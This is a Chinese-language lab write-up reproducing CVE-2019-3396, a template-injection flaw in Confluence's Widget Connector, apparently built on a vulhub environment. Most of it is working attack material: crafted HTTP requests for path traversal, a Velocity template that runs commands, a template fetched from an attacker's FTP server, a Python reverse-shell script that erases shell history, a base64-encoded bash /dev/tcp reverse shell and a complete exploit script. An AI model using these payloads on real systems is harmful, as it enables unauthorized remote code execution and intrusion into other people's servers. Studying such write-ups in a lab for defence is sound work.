# Confluence路径穿越与命令执行漏洞 （CVE-2019-3396）
# 0x01 漏洞概述
Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。

# 0x02 影响版本
- 6.6.12之前所有6.6.x版本
- 6.12.3之前所有6.12.x版本
- 6.13.13之前所有6.13.x版本
- 6.14.2之前所有6.14.x版本

# 0x03 环境搭建
https://github.com/vulhub/vulhub/blob/master/confluence/CVE-2019-3396/README.zh-cn.md

# 0x04 漏洞复现
**坑点：有些版本需要加Referer才能成功**

访问网站，根据标志确认目标系统，获取Confluence版本信息

![image](https://user-images.githubusercontent.com/84888757/172696062-00959b65-7318-4adb-b41d-1242251a4cf7.png)

## 4.1 读取文件
读取文件web.xml
按下图进行操作，抓包：

![image](https://user-images.githubusercontent.com/84888757/172696212-38a057f0-cad4-45ae-a723-5f43dd3faf24.png)

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Content-Length: 176

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}
```

数据包中重点关注的部分如图所示：

![image](https://user-images.githubusercontent.com/84888757/172696641-00f253f4-60ed-444f-9747-2d2236443ba6.png)

6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用`file:///etc/passwd`来读取文件，也可以通过`https://...`来加载远程文件。

![image](https://user-images.githubusercontent.com/84888757/172696732-c36c0db3-5583-4aab-8f9e-492ef49b8b8e.png)

## 4.2 命令执行
该文件是一个Velocity模板，我们可以通过模板注入（SSTI）来执行任意命令：
执行ifconfig

### 1、写r.vm文件
from https://github.com/pyn3rd/CVE-2019-3396

```
#set ($exp="exp")
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
#set($sc = $exp.getClass().forName("java.util.Scanner"))
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
#if($scan.hasNext())
    $scan.next()
#end
```

### 2、python开启ftp服务
```
pip install pyftpdlib
python3 -m pyftpdlib -p  8888
```

![image](https://user-images.githubusercontent.com/84888757/172696994-aa2eb486-fb97-403f-9bc9-3a4541820d5e.png)

![image](https://user-images.githubusercontent.com/84888757/172697041-c07f7a6b-decc-4f4e-9682-499d6f170add.png)


## 4.3 反弹shell
### 4.3.1 python反弹shell（需靶机存在python环境）
### 1、写nc.py
```
# -*- coding:utf-8 -*-
#!/usr/bin/env python
"""
back connect py version,only linux have pty module
code by google security team
"""
import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % name

def main():
    if len(sys.argv) !=3:
        usage(sys.argv[0])
        sys.exit()
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((sys.argv[1],int(sys.argv[2])))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()

if __name__ == '__main__':
    main()
```

### 2、python开启ftp服务
```
pip3 install pyftpdlib
python3 -m pyftpdlib -p  8888
```

![image](https://user-images.githubusercontent.com/84888757/172697728-a3746e99-e035-47bd-8808-0f75b433148c.png)

### 3、攻击方开启监听
`nc -lvvp 8989`

### 4、发送数据包
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 10.10.20.181
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Referer: http://10.10.20.181/
Content-Length: 232
X-Forwarded-For: 127.0.0.2
Connection: keep-alive

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"ftp://攻击方ip:8888/r.vm","command":"setsid python /tmp/nc.py 攻击方ip 8989"},"body":""}}
```

由于vulhub的该漏洞环境中没有python所以无法反弹，若能成功反弹如下图（图自[jas502n](https://github.com/jas502n/CVE-2019-3396)）：

![image](https://user-images.githubusercontent.com/84888757/172698186-505b4dcb-8552-4b6f-a0b3-3b8abde1290c.png)

## 4.3.2 bash一句话反弹shell
1、命令编码
使用base64编码来绕后java的机制，将command值换为base64的payload
编码网址：https://www.qqxiuzi.cn/bianma/base64.htm

```
# 反弹shell 
bash -i >& /dev/tcp/攻击方ip/port 0>&1 
# base64 后的命令 
bash -c {echo,payload的base64编码}|{base64,-d}|{bash,-i}
```

2、发送数据包
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 192.168.210.206:8090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 
Referer: http://192.168.210.206:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 303

{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"ftp://192.168.210.156:8888/r.vm","command":"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMC4xNTYvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"}}}
```

![image](https://user-images.githubusercontent.com/84888757/172699132-f71c48e3-caea-48b4-8e3b-9eb3c1ee0e59.png)

3、成功接收shell

![image](https://user-images.githubusercontent.com/84888757/172699267-79833875-16d8-4d8f-804b-797ad5e429a7.png)

## 4.4 命令执行 - 使用python 脚本
- 🔗 [cve-2019-3396.py @jas502n](https://github.com/jas502n/CVE-2019-3396/blob/master/cve-2019-3396.py)

`python2 cve-2019-3396.py 目标url "要执行的命令"`

（需根据实际情况修改pyftp部分）

```
#coding=utf-8

print(r'''
 _____              __ _                             ______  _____  _____ 
/  __ \            / _| |                            | ___ \/  __ \|  ___|
| /  \/ ___  _ __ | |_| |_   _  ___ _ __   ___ ___   | |_/ /| /  \/| |__  
| |    / _ \| '_ \|  _| | | | |/ _ \ '_ \ / __/ _ \  |    / | |    |  __| 
| \__/\ (_) | | | | | | | |_| |  __/ | | | (_|  __/  | |\ \ | \__/\| |___ 
 \____/\___/|_| |_|_| |_|\__,_|\___|_| |_|\___\___|  \_| \_| \____/\____/ 
                                                                          
                                By Jas502n
                                CVE-2019-3396                                          
                                         
 ''')
import os
import sys
import re
import requests


# url = "http://10.10.20.181"
url = sys.argv[1]
cmd = sys.argv[2]

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"https://127.0.0.1:8080",
    "http":"socks5h://127.0.0.1:1080",
    "https":"socks5h://127.0.0.1:1080"
}

paylaod = url + "/rest/tinymce/1/macro/preview"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Referer": url + "/pages/resumedraft.action?draftId=1&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
    "Content-Type": "application/json; charset=utf-8"
}

# pyftp = "file:///etc/passwd"

pyftp = "ftp://192.168.210.156:8887/r.vm"


data = '{"contentId":"1","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s","command":"%s"}}}' % (pyftp,cmd)
r = requests.post(paylaod, data=data, headers=headers)

# print r.content
if r.status_code == 200 and "wiki-content" in r.text:
    m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r.text, re.S)
    print "\n>>>>Usage: python test.py url cmd \n"
    print ">>>>Confluence Vuln url:  %s \n" %paylaod
    #去掉每行头尾空白
    print '>>>>Command Response:\n',m[0].strip()   
```

![image](https://user-images.githubusercontent.com/84888757/172699528-a4e2bff5-f3ed-4245-929a-c21b8d050293.png)


# 0x05 参考链接
- [Confluence 未授权 RCE (CVE-2019-3396) 漏洞利用 @jas502n](https://github.com/jas502n/CVE-2019-3396)
- [Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析](https://paper.seebug.org/884/)

